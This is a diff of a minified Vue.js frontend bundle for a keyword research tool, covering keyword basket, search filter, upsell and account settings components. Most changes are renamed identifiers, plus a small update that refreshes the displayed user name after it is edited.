                     current_tab: e.current_tab,
@@ -26099,14 +26121,14 @@ const Kz = Ue(SW, [
                     user_is_paid: e.user_is_paid
                 }, null, 8, ["loading", "current_tab", "current_sub_tab", "current_permissions", "show_upsell", "upsell_message", "keywords", "all_keywords", "onSort", "sort_by", "sort_direction", "allow_keyword_basket", "add_basket", "delete_basket", "search_engine", "keyword", "has_metrics", "current_metrics_currency", "onAll", "onSelect", "onDeselect", "selected_language_name", "current_free_results", "routes", "search_engine_name", "has_top_page_bid", "user_is_paid"]))])),
                 _: 1
-            }, 8, ["loading", "has_keywords", "has_metrics", "current_filter_is_on"]), e.loading || e.has_all_error || e.has_keywords ? T("", !0) : (b(), g("div", Mz, [S("div", Az, [S("div", Pz, [S("div", Lz, [S("h2", Bz, v(e.trans.get("Your Keyword Basket is empty")), 1), o.search_url ? (b(), g("p", {
+            }, 8, ["loading", "has_keywords", "has_metrics", "current_filter_is_on"]), e.loading || e.has_all_error || e.has_keywords ? T("", !0) : (b(), g("div", Mz, [S("div", Az, [S("div", Pz, [S("div", $z, [S("h2", Lz, v(e.trans.get("Your Keyword Basket is empty")), 1), o.search_url ? (b(), g("p", {
                 key: 0,
                 innerHTML: e.trans.get('<a href=":search_url">Start searching for keywords</a> and add them into your Keyword Basket from the search results page.', {
                     search_url: o.search_url
                 })
-            }, null, 8, $z)) : (b(), g("p", Dz, v(e.trans.get("Start searching for keywords and add them into your Keyword Basket from the search results page.")), 1)), S("p", null, v(e.trans.get("You can add up to :limit keywords.", {
+            }, null, 8, Dz)) : (b(), g("p", jz, v(e.trans.get("Start searching for keywords and add them into your Keyword Basket from the search results page.")), 1)), S("p", null, v(e.trans.get("You can add up to :limit keywords.", {
                 limit: e.basket_keywords_limit_format
-            })), 1)]), S("div", Oz, [S("div", jz, [Vz, S("div", Hz, [S("img", {
+            })), 1)]), S("div", Oz, [S("div", Wz, [Vz, S("div", Hz, [S("img", {
                 src: "/images/svg/undraw_void_3ggu.svg",
                 class: "img-warning img-fluid my-4",
                 alt: "Warning image"
@@ -26143,12 +26165,12 @@ const Kz = Ue(SW, [
                     }, "dropdown-item btn-delete-basket-keywords"]),
                     onClick: t[21] || (t[21] = e => o.delete_basket()),
                     href: "javascript:"
-                }, [Rz, P(" " + v(e.trans.get("Delete")), 1)], 2)])),
+                }, [Bz, P(" " + v(e.trans.get("Delete")), 1)], 2)])),
                 _: 1
             }, 8, ["loading", "all_keywords", "total_keywords", "selected", "allow_keyword_basket"])])
         }]
     ]),
-    Jz = {
+    Kz = {
         key: 0,
         class: "app-loading modal fade show d-block mt-4",
         "data-bs-backdrop": "static",
@@ -26156,7 +26178,7 @@ const Kz = Ue(SW, [
         tabindex: "-1",
         "aria-hidden": "true"
     },
-    Wz = {
+    Jz = {
         class: "modal-dialog modal-dialog-centered modal-sm"
     },
     zz = {
@@ -26183,7 +26205,7 @@ const eY = Ue({
         data: () => ({})
     }, [
         ["render", function(e, t, r, s, a, o) {
-            return r.loading ? (b(), g("div", Jz, [S("div", Wz, [S("div", zz, [S("div", Yz, [S("div", Gz, [S("div", Xz, [S("span", Qz, v(e.trans.get("Loading...")), 1)]), S("span", Zz, v(e.trans.get("Loading...")), 1)])])])])])) : T("", !0)
+            return r.loading ? (b(), g("div", Kz, [S("div", Jz, [S("div", zz, [S("div", Yz, [S("div", Gz, [S("div", Xz, [S("span", Qz, v(e.trans.get("Loading...")), 1)]), S("span", Zz, v(e.trans.get("Loading...")), 1)])])])])])) : T("", !0)
         }]
     ]),
     tY = {
@@ -26301,7 +26323,7 @@ const lY = Ue(tY, [
                 role: "document"
             }, [S("div", {
                 class: "modal-content",
-                style: D([!r.size && r.auto_width ? "width: auto" : "", "" != r.width ? "width: " + r.width : "", "" != r.height ? "height: " + r.height : ""])
+                style: j([!r.size && r.auto_width ? "width: auto" : "", "" != r.width ? "width: " + r.width : "", "" != r.height ? "height: " + r.height : ""])
             }, [o.hasHeaderSlot || r.allow_close ? (b(), g("div", sY, [S("div", aY, [o.hasHeaderSlot ? V(e.$slots, "header", {
                 key: 0
             }) : T("", !0)]), r.allow_close ? (b(), g("button", oY)) : T("", !0)])) : T("", !0), S("div", iY, [V(e.$slots, "body")]), o.hasFooterSlot ? (b(), g("div", nY, [V(e.$slots, "footer")])) : T("", !0)], 4)], 2)], 8, rY)
@@ -26326,7 +26348,7 @@ const mY = Ue(cY, [
             return F((b(), g("div", _Y, [S("table", null, [S("tbody", null, [uY, S("td", null, [S("span", {
                 innerHTML: e.trans.get("It seems like it is taking too long to load. Please refresh the page to retry.")
             }, null, 8, dY)])])])], 512)), [
-                [B, r.suggest_page_reload]
+                [L, r.suggest_page_reload]
             ])
         }]
     ]),
@@ -26421,22 +26443,22 @@ const MY = Ue(hY, [
         class: "alert-pro-upsell alert-pro-upsell-above-summary mb-4 mt-2",
         role: "alert"
     },
-    LY = {
+    $Y = {
         class: "row"
     },
-    BY = S("div", {
+    LY = S("div", {
         class: "col-lg-1 d-none d-lg-block"
     }, null, -1),
-    $Y = {
+    DY = {
         class: "col-sm-12 col-md-12 col-lg-10"
     },
-    DY = {
+    jY = {
         class: "card text-center shadow"
     },
     OY = {
         class: "card-body"
     },
-    jY = S("h5", {
+    WY = S("h5", {
         class: "card-title"
     }, " 🚀 Keyword Tool Pro ", -1),
     VY = {
@@ -26447,13 +26469,13 @@ const MY = Ue(hY, [
     NY = S("i", {
         class: "bi bi-box-arrow-in-right me-1"
     }, null, -1),
-    RY = ["innerHTML"],
-    KY = S("div", {
+    BY = ["innerHTML"],
+    RY = S("div", {
         class: "col-lg-1 d-none d-lg-block"
     }, null, -1);
-const JY = Ue(AY, [
+const KY = Ue(AY, [
         ["render", function(e, t, r, s, a, o) {
-            return r.current_permissions.pro_is_paused || r.current_permissions.show_search_volume_data ? T("", !0) : (b(), g("div", PY, [S("div", LY, [BY, S("div", $Y, [S("div", DY, [S("div", OY, [jY, S("div", VY, [V(e.$slots, "message", {}, (() => [S("p", {
+            return r.current_permissions.pro_is_paused || r.current_permissions.show_search_volume_data ? T("", !0) : (b(), g("div", PY, [S("div", $Y, [LY, S("div", DY, [S("div", jY, [S("div", OY, [WY, S("div", VY, [V(e.$slots, "message", {}, (() => [S("p", {
                 innerHTML: e.trans.get("Need to add more than :count_free negative keywords?", {
                     count_free: 5
                 })
@@ -26466,10 +26488,10 @@ const JY = Ue(AY, [
                 innerHTML: e.trans.get("Try Keyword Tool Pro to use up to :count_pro negative keywords for every search!", {
                     count_pro: "2,000"
                 })
-            }, null, 8, RY)]))], 8, IY)])])]), KY])]))
+            }, null, 8, BY)]))], 8, IY)])])]), RY])]))
         }]
     ]),
-    WY = {
+    JY = {
         props: ["user_is_paid", "has_metrics", "current_tab"],
         data() {
             return {
@@ -26515,7 +26537,7 @@ const JY = Ue(AY, [
     aG = S("div", {
         class: "col-3 d-lg-none d-xl-none"
     }, null, -1);
-const oG = Ue(WY, [
+const oG = Ue(JY, [
         ["render", function(e, t, r, s, a, o) {
             return b(), g("div", zY, [S("div", YY, [S("div", GY, [S("div", XY, [S("h2", QY, v(a.errorMessage), 1), S("p", null, v(e.trans.get("Search results may be incomplete or unavailable.")), 1), S("p", null, [S("a", {
                 href: "#",
@@ -26671,18 +26693,18 @@ const AG = Ue({
         type: "button",
         class: "btn-search-results-settings-display-trend btn btn-sm btn-outline-primary disabled cursor-default my-1 mx-1"
     },
-    LG = {
+    $G = {
         class: "search-results-settings-display-trend-label me-1"
     },
-    BG = {
+    LG = {
         key: 0,
         class: "search-results-settings-display-trend-value"
     },
-    $G = {
+    DG = {
         key: 1,
         class: "search-results-settings-display-trend-value"
     },
-    DG = {
+    jG = {
         key: 2,
         class: "search-results-settings-display-trend-value"
     };
@@ -26691,14 +26713,14 @@ const OG = Ue({
         data: () => ({})
     }, [
         ["render", function(e, t, r, s, a, o) {
-            return !r.current_permissions.show_search_volume_data || null == r.show_current_filter_search_volume_trend_min && null == r.show_current_filter_search_volume_trend_max ? T("", !0) : (b(), g("button", PG, [S("strong", LG, v(e.trans.get("Trend")) + ":", 1), null != r.show_current_filter_search_volume_trend_min && null != r.show_current_filter_search_volume_trend_max ? (b(), g("span", BG, v(e.$filters.digit(r.show_current_filter_search_volume_trend_min)) + "% " + v(e.trans.get("to")) + " " + v(e.$filters.digit(r.show_current_filter_search_volume_trend_max)) + "% ", 1)) : null == r.show_current_filter_search_volume_trend_max && null != r.show_current_filter_search_volume_trend_min ? (b(), g("span", $G, v(e.trans.get("more than")) + " " + v(e.$filters.digit(r.show_current_filter_search_volume_trend_min)) + "% ", 1)) : null == r.show_current_filter_search_volume_trend_min && null != r.show_current_filter_search_volume_trend_max ? (b(), g("span", DG, v(e.trans.get("less than")) + " " + v(e.$filters.digit(r.show_current_filter_search_volume_trend_max)) + "% ", 1)) : T("", !0), S("a", {
+            return !r.current_permissions.show_search_volume_data || null == r.show_current_filter_search_volume_trend_min && null == r.show_current_filter_search_volume_trend_max ? T("", !0) : (b(), g("button", PG, [S("strong", $G, v(e.trans.get("Trend")) + ":", 1), null != r.show_current_filter_search_volume_trend_min && null != r.show_current_filter_search_volume_trend_max ? (b(), g("span", LG, v(e.$filters.digit(r.show_current_filter_search_volume_trend_min)) + "% " + v(e.trans.get("to")) + " " + v(e.$filters.digit(r.show_current_filter_search_volume_trend_max)) + "% ", 1)) : null == r.show_current_filter_search_volume_trend_max && null != r.show_current_filter_search_volume_trend_min ? (b(), g("span", DG, v(e.trans.get("more than")) + " " + v(e.$filters.digit(r.show_current_filter_search_volume_trend_min)) + "% ", 1)) : null == r.show_current_filter_search_volume_trend_min && null != r.show_current_filter_search_volume_trend_max ? (b(), g("span", jG, v(e.trans.get("less than")) + " " + v(e.$filters.digit(r.show_current_filter_search_volume_trend_max)) + "% ", 1)) : T("", !0), S("a", {
                 class: "search-results-settings-display-trend-remove ms-1 text-decoration-none",
                 href: "javascript:",
                 onClick: t[0] || (t[0] = t => e.$emit("clearFilter", "search_volume_trend"))
             }, "×")]))
         }]
     ]),
-    jG = {
+    WG = {
         key: 0,
         type: "button",
         class: "btn-search-results-settings-display-keyword-result-period btn btn-sm btn-outline-primary disabled cursor-default my-1 mx-1"
@@ -26715,7 +26737,7 @@ const IG = Ue({
         data: () => ({})
     }, [
         ["render", function(e, t, r, s, a, o) {
-            return r.current_permissions.show_custom_time && r.show_current_filter_keyword_result_period && r.show_current_filter_keyword_result_period != r.default_keyword_result_period ? (b(), g("button", jG, [S("strong", VG, v(e.trans.get("Result Period")) + ":", 1), S("span", HG, v(r.show_current_filter_keyword_result_period), 1), S("a", {
+            return r.current_permissions.show_custom_time && r.show_current_filter_keyword_result_period && r.show_current_filter_keyword_result_period != r.default_keyword_result_period ? (b(), g("button", WG, [S("strong", VG, v(e.trans.get("Result Period")) + ":", 1), S("span", HG, v(r.show_current_filter_keyword_result_period), 1), S("a", {
                 class: "search-results-settings-display-keyword-result-period-remove ms-1 text-decoration-none",
                 href: "javascript:",
                 onClick: t[0] || (t[0] = t => e.$emit("clearFilter", "keyword_result_period"))
@@ -26727,18 +26749,18 @@ const IG = Ue({
         type: "button",
         class: "btn-search-results-settings-display-average-cpc btn btn-sm btn-outline-primary disabled cursor-default my-1 mx-1"
     },
-    RG = {
+    BG = {
         class: "search-results-settings-display-average-cpc-label me-1"
     },
-    KG = {
+    RG = {
         key: 0,
         class: "search-results-settings-display-average-cpc-value"
     },
-    JG = {
+    KG = {
         key: 1,
         class: "search-results-settings-display-average-cpc-value"
     },
-    WG = {
+    JG = {
         key: 2,
         class: "search-results-settings-display-average-cpc-value"
     };
@@ -26747,7 +26769,7 @@ const zG = Ue({
         data: () => ({})
     }, [
         ["render", function(e, t, r, s, a, o) {
-            return r.current_permissions.show_cpc_data && (r.show_current_filter_average_cpc_min > 0 || r.show_current_filter_average_cpc_max > 0) ? (b(), g("button", NG, [S("strong", RG, v(e.trans.get("Average CPC")) + ":", 1), r.show_current_filter_average_cpc_min > 0 && r.show_current_filter_average_cpc_max > 0 ? (b(), g("span", KG, v(e.$filters.decimal(r.show_current_filter_average_cpc_min)) + " " + v(e.trans.get("to")) + " " + v(e.$filters.decimal(r.show_current_filter_average_cpc_max)), 1)) : r.show_current_filter_average_cpc_min > 0 && !r.show_current_filter_average_cpc_max ? (b(), g("span", JG, v(e.trans.get("more than")) + " " + v(e.$filters.decimal(r.show_current_filter_average_cpc_min)), 1)) : !r.show_current_filter_average_cpc_min && r.show_current_filter_average_cpc_max > 0 ? (b(), g("span", WG, v(e.trans.get("less than")) + " " + v(e.$filters.decimal(r.show_current_filter_average_cpc_max)), 1)) : T("", !0), S("a", {
+            return r.current_permissions.show_cpc_data && (r.show_current_filter_average_cpc_min > 0 || r.show_current_filter_average_cpc_max > 0) ? (b(), g("button", NG, [S("strong", BG, v(e.trans.get("Average CPC")) + ":", 1), r.show_current_filter_average_cpc_min > 0 && r.show_current_filter_average_cpc_max > 0 ? (b(), g("span", RG, v(e.$filters.decimal(r.show_current_filter_average_cpc_min)) + " " + v(e.trans.get("to")) + " " + v(e.$filters.decimal(r.show_current_filter_average_cpc_max)), 1)) : r.show_current_filter_average_cpc_min > 0 && !r.show_current_filter_average_cpc_max ? (b(), g("span", KG, v(e.trans.get("more than")) + " " + v(e.$filters.decimal(r.show_current_filter_average_cpc_min)), 1)) : !r.show_current_filter_average_cpc_min && r.show_current_filter_average_cpc_max > 0 ? (b(), g("span", JG, v(e.trans.get("less than")) + " " + v(e.$filters.decimal(r.show_current_filter_average_cpc_max)), 1)) : T("", !0), S("a", {
                 onClick: t[0] || (t[0] = t => e.$emit("clearFilter", "average_cpc")),
                 class: "search-results-settings-display-average-cpc-remove ms-1 text-decoration-none",
                 href: "javascript:"
@@ -26969,34 +26991,34 @@ const SX = Ue({
     PX = {
         class: "modal-body"
     },
-    LX = {
+    $X = {
         class: "modal-footer"
     },
-    BX = {
+    LX = {
         type: "button",
         class: "btn-search-results-settings-modal-close btn btn-link text-decoration-none",
         "data-bs-dismiss": "modal"
     },
-    $X = ["disabled"],
-    DX = S("i", {
+    DX = ["disabled"],
+    jX = S("i", {
         class: "bi bi-repeat me-1"
     }, null, -1),
     OX = S("i", {
         class: "bi bi-save me-1"
     }, null, -1);
-const jX = Ue(TX, [
+const WX = Ue(TX, [
         ["render", function(e, t, r, s, a, o) {
             return b(), g("div", FX, [S("div", qX, [S("div", EX, [S("div", UX, [S("h4", MX, v(e.trans.get("Settings")), 1), S("button", {
                 type: "button",
                 class: "btn-close",
                 "data-bs-dismiss": "modal",
                 "aria-label": e.trans.get("Close")
-            }, null, 8, AX)]), S("div", PX, [V(e.$slots, "content")]), S("div", LX, [S("button", BX, v(e.trans.get("Close")), 1), S("button", {
+            }, null, 8, AX)]), S("div", PX, [V(e.$slots, "content")]), S("div", $X, [S("button", LX, v(e.trans.get("Close")), 1), S("button", {
                 disabled: r.filter_counter <= 0,
                 onClick: t[0] || (t[0] = t => e.$emit("resetFilter")),
                 type: "button",
                 class: "btn-search-results-settings-modal-reset btn btn-outline-primary"
-            }, [DX, P(" " + v(e.trans.get("Reset")), 1)], 8, $X), S("button", {
+            }, [jX, P(" " + v(e.trans.get("Reset")), 1)], 8, DX), S("button", {
                 onClick: t[1] || (t[1] = t => e.$emit("applyFilter")),
                 type: "button",
                 class: "btn-search-results-settings-modal-save btn btn-primary"
@@ -27018,16 +27040,16 @@ const jX = Ue(TX, [
     NX = {
         class: "row"
     },
-    RX = {
+    BX = {
         class: "col"
+    },
+    RX = {
+        class: "my-2"
     },
     KX = {
         class: "my-2"
     },
     JX = {
-        class: "my-2"
-    },
-    WX = {
         class: "my-2"
     },
     zX = {
@@ -27061,7 +27083,7 @@ const aQ = Ue(VX, [
         ["render", function(e, t, r, s, a, o) {
             return r.loading || r.has_all_error || r.has_error ? T("", !0) : (b(), g("div", HX, [r.has_keywords ? r.has_keywords && !r.has_metrics ? (b(), g("div", tQ, [S("h4", rQ, v(e.trans.get("Sorry, no keywords match your filters")), 1), S("p", {
                 innerHTML: e.trans.get('Please, <a href="#" data-bs-toggle="modal" data-bs-target="#search-results-setting-modal">modify filters</a> to find more keywords.')
-            }, null, 8, sQ)])) : T("", !0) : (b(), g("div", IX, [S("div", NX, [S("div", RX, [V(e.$slots, "message"), S("p", null, v(e.trans.get("Below are some tips that might help you find more keywords:")), 1), S("ul", null, [S("li", KX, v(e.trans.get('Use fewer words in your search query. For example, "popular shoes" instead of "most popular shoes for men in my hometown";')), 1), S("li", JX, v(e.trans.get("Check for spelling mistakes;")), 1), S("li", WX, v(e.trans.get('Try searching for a similar term or synonym. For example, "pants" instead of "trousers";')), 1), S("li", zX, v(e.trans.get("Please note that search engines restrict some topics.If the search term falls under a restricted topic, you might not see any keyword suggestions and/or search volume data.")), 1)]), S("p", null, v(e.trans.get("Please try again!")), 1)]), S("div", YX, [S("div", GX, [XX, S("div", QX, [S("img", {
+            }, null, 8, sQ)])) : T("", !0) : (b(), g("div", IX, [S("div", NX, [S("div", BX, [V(e.$slots, "message"), S("p", null, v(e.trans.get("Below are some tips that might help you find more keywords:")), 1), S("ul", null, [S("li", RX, v(e.trans.get('Use fewer words in your search query. For example, "popular shoes" instead of "most popular shoes for men in my hometown";')), 1), S("li", KX, v(e.trans.get("Check for spelling mistakes;")), 1), S("li", JX, v(e.trans.get('Try searching for a similar term or synonym. For example, "pants" instead of "trousers";')), 1), S("li", zX, v(e.trans.get("Please note that search engines restrict some topics.If the search term falls under a restricted topic, you might not see any keyword suggestions and/or search volume data.")), 1)]), S("p", null, v(e.trans.get("Please try again!")), 1)]), S("div", YX, [S("div", GX, [XX, S("div", QX, [S("img", {
                 src: "/images/svg/undraw_void_3ggu.svg",
                 class: "img-void img-fluid my-3",
                 alt: "Void image"
@@ -27207,14 +27229,14 @@ const UQ = Ue({
     PQ = {
         class: "search-results-settings-modal-filter-keywords-help form-text text-muted mb-2"
     },
-    LQ = ["placeholder", "value"],
-    BQ = {
+    $Q = ["placeholder", "value"],
+    LQ = {
         class: "search-results-settings-modal-negative-keywords-remaining form-text text-muted"
     },
-    $Q = {
+    DQ = {
         class: "search-results-settings-modal-negative-keywords-help form-text text-muted"
     };
-const DQ = Ue({
+const jQ = Ue({
         props: ["current_negative_keywords", "error_fields", "current_remain_negative_keywords"],
         data: () => ({})
     }, [
@@ -27229,13 +27251,13 @@ const DQ = Ue({
                 value: r.current_negative_keywords,
                 name: "negative_keywords",
                 onInput: t[1] || (t[1] = t => e.$emit("update:current_negative_keywords", t.target.value))
-            }, null, 42, LQ), S("small", BQ, [S("strong", null, v(e.$filters.digit(r.current_remain_negative_keywords)), 1), P(" " + v(e.trans.get("negative keywords remaining.")), 1)]), S("small", $Q, v(e.trans.get("Put your negative keywords in this box, one keyword per line.")), 1)])
+            }, null, 42, $Q), S("small", LQ, [S("strong", null, v(e.$filters.digit(r.current_remain_negative_keywords)), 1), P(" " + v(e.trans.get("negative keywords remaining.")), 1)]), S("small", DQ, v(e.trans.get("Put your negative keywords in this box, one keyword per line.")), 1)])
         }]
     ]),
     OQ = {
         class: "search-results-settings-modal-search-network mb-3"
     },
-    jQ = {
+    WQ = {
         class: "form-label search-results-settings-modal-search-network-label"
     },
     VQ = {
@@ -27248,7 +27270,7 @@ const NQ = Ue({
         data: () => ({})
     }, [
         ["render", function(e, t, r, s, a, o) {
-            return b(), g("div", OQ, [S("label", jQ, v(e.trans.get("Search Network")), 1), (b(!0), g(y, null, w(r.current_network_list, (s => (b(), g("div", VQ, [S("input", {
+            return b(), g("div", OQ, [S("label", WQ, v(e.trans.get("Search Network")), 1), (b(!0), g(y, null, w(r.current_network_list, (s => (b(), g("div", VQ, [S("input", {
                 id: "google_network_" + s.id,
                 class: "search-results-settings-modal-search-network-value form-check-input",
                 disabled: r.disabled,
@@ -27262,13 +27284,13 @@ const NQ = Ue({
             }, v(s.text), 9, IQ)])))), 256))])
         }]
     ]),
-    RQ = {
+    BQ = {
         class: "search-results-settings-modal-currency mb-3"
     },
-    KQ = {
+    RQ = {
         class: "form-label search-results-settings-modal-currency-label"
     };
-const JQ = Ue({
+const KQ = Ue({
         props: ["current_currency_list", "current_metrics_currency", "disabled"],
         data: () => ({
             select2_settings: {}
@@ -27277,7 +27299,7 @@ const JQ = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("tom-select");
-            return b(), g("div", RQ, [S("label", KQ, v(e.trans.get("Currency")), 1), E(i, {
+            return b(), g("div", BQ, [S("label", RQ, v(e.trans.get("Currency")), 1), E(i, {
                 id: "metrics_currency_selection",
                 class: "search-results-settings-modal-currency-value",
                 options: r.current_currency_list,
@@ -27289,7 +27311,7 @@ const JQ = Ue({
             }, null, 8, ["options", "settings", "disabled", "model-value", "placeholder"])])
         }]
     ]),
-    WQ = {
+    JQ = {
         key: 0,
         class: "search-results-settings-modal-search-volume mb-3"
     },
@@ -27309,8 +27331,8 @@ const ZQ = Ue({
         data: () => ({})
     }, [
         ["render", function(e, t, r, s, a, o) {
-            const i = L("mask");
-            return r.current_permissions.show_search_volume_data ? (b(), g("div", WQ, [S("label", zQ, v(e.trans.get("Search Volume")), 1), S("div", YQ, [F(S("input", {
+            const i = $("mask");
+            return r.current_permissions.show_search_volume_data ? (b(), g("div", JQ, [S("label", zQ, v(e.trans.get("Search Volume")), 1), S("div", YQ, [F(S("input", {
                 placeholder: "min",
                 type: "text",
                 class: f(["form-control", {
@@ -27355,7 +27377,7 @@ const iZ = Ue({
         data: () => ({})
     }, [
         ["render", function(e, t, r, s, a, o) {
-            const i = L("mask");
+            const i = $("mask");
             return r.current_permissions.show_search_volume_data ? (b(), g("div", eZ, [S("label", tZ, v(e.trans.get("Trend")), 1), S("div", rZ, [F(S("input", {
                 placeholder: "min",
                 type: "text",
@@ -27401,7 +27423,7 @@ const mZ = Ue({
         data: () => ({})
     }, [
         ["render", function(e, t, r, s, a, o) {
-            const i = L("mask");
+            const i = $("mask");
             return r.current_permissions.show_cpc_data ? (b(), g("div", nZ, [S("label", lZ, v(e.trans.get("Average CPC")), 1), S("div", cZ, [F(S("input", {
                 placeholder: "min",
                 type: "text",
@@ -27447,7 +27469,7 @@ const bZ = Ue({
         data: () => ({})
     }, [
         ["render", function(e, t, r, s, a, o) {
-            const i = L("mask");
+            const i = $("mask");
             return r.current_permissions.show_competition_data ? (b(), g("div", hZ, [S("label", pZ, v(e.trans.get("Competition")), 1), S("div", gZ, [F(S("input", {
                 placeholder: "min",
                 type: "text",
@@ -27581,25 +27603,25 @@ const EZ = Ue({
     PZ = {
         class: "mb-4"
     },
-    LZ = ["innerHTML"],
-    BZ = {
+    $Z = ["innerHTML"],
+    LZ = {
         key: 2
     },
-    $Z = {
+    DZ = {
         key: 3,
         class: "search-results-table-wrapper"
     };
-const DZ = Ue(UZ, [
+const jZ = Ue(UZ, [
         ["render", function(e, t, r, s, a, o) {
-            return b(), g("div", null, [r.loading || r.has_keywords ? r.loading || !r.current_filter_is_on || r.has_metrics ? r.loading || !r.has_keywords || r.has_metrics ? (b(), g("div", $Z, [V(e.$slots, "wrapper")])) : (b(), g("div", BZ)) : (b(), g("div", AZ, [S("h4", PZ, v(e.trans.get("Sorry, no keywords match your filters")), 1), S("p", {
+            return b(), g("div", null, [r.loading || r.has_keywords ? r.loading || !r.current_filter_is_on || r.has_metrics ? r.loading || !r.has_keywords || r.has_metrics ? (b(), g("div", DZ, [V(e.$slots, "wrapper")])) : (b(), g("div", LZ)) : (b(), g("div", AZ, [S("h4", PZ, v(e.trans.get("Sorry, no keywords match your filters")), 1), S("p", {
                 innerHTML: e.trans.get('Please, <a href="#" data-bs-toggle="modal" data-bs-target="#search-results-setting-modal">modify filters</a> to find more keywords.')
-            }, null, 8, LZ)])) : (b(), g("div", MZ))])
+            }, null, 8, $Z)])) : (b(), g("div", MZ))])
         }]
     ]),
     OZ = {
         class: "search-results-keyword-list position-fixed float-end end-0 bottom-0 z-1 mb-4"
     },
-    jZ = {
+    WZ = {
         class: "btn-group dropup me-3"
     },
     VZ = {
@@ -27611,7 +27633,7 @@ const HZ = Ue({
     }, [
         ["render", function(e, t, r, s, a, o) {
             const i = k("dropdown-menu-item-button");
-            return b(), g("div", OZ, [S("div", jZ, [E(i, {
+            return b(), g("div", OZ, [S("div", WZ, [E(i, {
                 loading: r.loading,
                 all_keywords: r.all_keywords,
                 total_keywords: r.total_keywords,
@@ -27628,16 +27650,16 @@ const HZ = Ue({
         data: () => ({})
     },
     NZ = ["disabled"],
-    RZ = {
+    BZ = {
         key: 0
     },
-    KZ = [S("i", {
+    RZ = [S("i", {
         class: "bi bi-cart ms-1"
     }, null, -1)],
-    JZ = S("span", null, [S("i", {
+    KZ = S("span", null, [S("i", {
         class: "bi bi-download ms-1"
     })], -1),
-    WZ = S("span", null, [S("i", {
+    JZ = S("span", null, [S("i", {
         class: "bi bi-clipboard ms-1"
     })], -1),
     zZ = {
@@ -27666,7 +27688,7 @@ const ZZ = Ue(IZ, [
                 "aria-expanded": "false",
                 "data-bs-auto-close": "true",
                 id: "floatedActionsButtons"
-            }, [r.allow_keyword_basket ? (b(), g("span", RZ, KZ)) : T("", !0), JZ, WZ, r.allow_delete ? (b(), g("span", zZ, YZ)) : T("", !0), S("span", GZ, [r.loading || 0 != r.selected.length ? (b(), g("strong", QZ, v(e.$filters.digit(r.selected.length)), 1)) : (b(), g("strong", XZ, v(e.$filters.digit(r.total_keywords)), 1))])], 8, NZ)
+            }, [r.allow_keyword_basket ? (b(), g("span", BZ, RZ)) : T("", !0), KZ, JZ, r.allow_delete ? (b(), g("span", zZ, YZ)) : T("", !0), S("span", GZ, [r.loading || 0 != r.selected.length ? (b(), g("strong", QZ, v(e.$filters.digit(r.selected.length)), 1)) : (b(), g("strong", XZ, v(e.$filters.digit(r.total_keywords)), 1))])], 8, NZ)
         }]
     ]),
     e1 = {
@@ -27895,14 +27917,25 @@ const f1 = Ue(y1, [
                         }
                     });
                     this.processSuccess(r)
-                } catch (j2) {
-                    this.loading = !1, j2.response.data.errors && (this.showError(j2.response.data.message), _.forEach(j2.response.data.errors, ((e, t) => {
+                } catch (W2) {
+                    this.loading = !1, W2.response.data.errors && (this.showError(W2.response.data.message), _.forEach(W2.response.data.errors, ((e, t) => {
                         document.getElementById(t).classList.add("is-invalid"), "new_password" != t && "old_password" != t && "current_password" != t || document.getElementById("eye_" + t).classList.add("border-danger")
                     })))
                 }
             },
             processSuccess(e) {
-                if ("editPassword" == this.editMode && this.hidePassword(null, "new_password", "hidePassword", "showPassword"), this.editMode = "", this.loading = !1, e && e.data && e.data.redirect) return e.data.open ? window.open(e.data.redirect) : window.location = e.data.redirect;
+                let t = this.editMode;
+                if ("editPassword" == t) this.hidePassword(null, "new_password", "hidePassword", "showPassword");
+                else if ("editName" == t) {
+                    let e = document.querySelectorAll(".authname");
+                    _.forEach(e, (e => {
+                        e.innerHTML = _.truncate(this.name, {
+                            length: 20,
+                            omission: "..."
+                        })
+                    }))
+                }
+                if (this.editMode = "", this.loading = !1, e && e.data && e.data.redirect) return e.data.open ? window.open(e.data.redirect) : window.location = e.data.redirect;
                 if (e && e.data && e.data.redirect_with_message) bsDialogs.create(e.data.redirect_with_message.message, [{
                     classes: "btn-danger mx-auto",
                     text: this.trans.get("OK"),
@@ -27970,15 +28003,15 @@ const f1 = Ue(y1, [
     P1 = {
         class: "col-sm-7"
     },
-    L1 = ["innerHTML"],
-    B1 = {
+    $1 = ["innerHTML"],
+    L1 = {
         class: "col-sm-2"
     },
-    $1 = {
+    D1 = {
         key: 0,
         class: "input-group"
     },
-    D1 = {
+    j1 = {
         class: "input-group-prepend"
     },
     O1 = {
@@ -27987,7 +28020,7 @@ const f1 = Ue(y1, [
         "data-bs-toggle": "dropdown",
         "aria-expanded": "false"
     },
-    j1 = {
+    W1 = {
         class: "dropdown-menu"
     },
     V1 = S("hr", {
@@ -28002,16 +28035,16 @@ const f1 = Ue(y1, [
     N1 = {
         class: "row"
     },
-    R1 = {
+    B1 = {
         for: "name",
         class: "col-sm-3 col-form-label form-label"
     },
-    K1 = ["placeholder", "readonly"],
-    J1 = {
+    R1 = ["placeholder", "readonly"],
+    K1 = {
         key: 0,
         class: "text-end"
     },
-    W1 = S("i", {
+    J1 = S("i", {
         class: "bi bi-pencil-fill"
     }, null, -1),
     z1 = {
@@ -28128,9 +28161,9 @@ const E0 = Ue(b1, [
                 class: f(["d-inline-block", "currentPlan" == a.editMode ? "form-control" : "bg-white shadow-none border-0 px-0 py-2"]),
                 id: "currentPlan",
                 innerHTML: r.plan_roles
-            }, null, 10, L1)]), S("div", B1, [r.allowed_pro_upgrade || r.allowed_api_upgrade ? (b(), g(y, {
+            }, null, 10, $1)]), S("div", L1, [r.allowed_pro_upgrade || r.allowed_api_upgrade ? (b(), g(y, {
                 key: 0
-            }, [r.allowed_pro_upgrade && r.allowed_api_upgrade ? (b(), g("div", $1, [S("div", D1, [S("button", O1, v(e.trans.get("Upgrade")), 1), S("div", j1, [S("a", {
+            }, [r.allowed_pro_upgrade && r.allowed_api_upgrade ? (b(), g("div", D1, [S("div", j1, [S("button", O1, v(e.trans.get("Upgrade")), 1), S("div", W1, [S("a", {
                 class: "dropdown-item",
                 href: "#",
                 onClick: t[0] || (t[0] = t => e.$root.open_modal("upgrade_pro_plan_modal"))
@@ -28152,7 +28185,7 @@ const E0 = Ue(b1, [
                 onClick: t[3] || (t[3] = t => e.$root.open_modal("upgrade_api_plan_modal")),
                 type: "button",
                 class: "btn btn-primary form-control"
-            }, v(e.trans.get("Upgrade")), 1)) : T("", !0)], 64)) : T("", !0)], 64)) : T("", !0)])])])]), V1, S("div", H1, [S("div", I1, [S("div", N1, [S("label", R1, v(e.trans.get("Full Name")), 1), S("div", {
